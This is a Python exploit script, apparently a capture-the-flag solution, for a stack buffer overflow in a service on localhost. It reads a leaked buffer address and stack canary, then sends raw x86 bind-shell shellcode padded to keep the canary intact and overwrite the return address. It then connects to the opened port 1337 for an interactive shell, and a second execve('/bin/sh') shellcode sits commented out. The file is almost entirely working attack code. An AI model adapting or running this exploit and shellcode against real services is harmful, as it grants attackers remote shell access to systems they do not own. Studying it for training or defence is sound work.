import socket
import struct
import telnetlib
from time import sleep


# Local
target_host = "localhost"
target_port = 31338

# Remote
#target_host = ""
#target_port = 1337

def p64(data):
	return struct.pack('<Q',data)

def p32(data):
	return struct.pack('<I',data)

def u64(data):
	return struct.unpack('<Q',data)[0]

def u32(data):
	return struct.unpack('<I',data)[0]

def sock():
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((target_host,target_port))
	return s

def interactive(s):
	print("[!!!!!] G0T A $HELL ! [!!!!!]")
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

def debug_print(prompt,value,formatting = 16):
	if formatting == 16:
		print("[+] " + prompt + "= {0:x}".format(value))
	else:
		print("[+] " + prompt + "= {0:d}".format(value))

def write_buf(data):
	fd = open('buf','wb')
	fd.write(data)
	fd.close()


def main():
	# main exploit here

	s = sock()

	buf_addr = u32(s.recv(4))
	canary_value = u32(s.recv(4))

	print(s.recv(1024))

	debug_print("buf_addr",buf_addr)
	debug_print("canary_value",canary_value)

	# important value define
	

	# payload create
	buf = "\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"

	#buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
	buf += 'A' * (0x800 - len(buf))
	buf += p32(canary_value)
	buf += 'A' * 12
	buf += p32(buf_addr)
	buf += 'A' * (0x1000 - len(buf))

	# send and recv

	s.send(buf)
	#s.recv(1024)

	# interactive
	s.close()
	global target_port
	target_port = 1337
	s = sock()
	#print("execute nc localhost 1337")
	interactive(s)


if __name__ == '__main__':
	main()





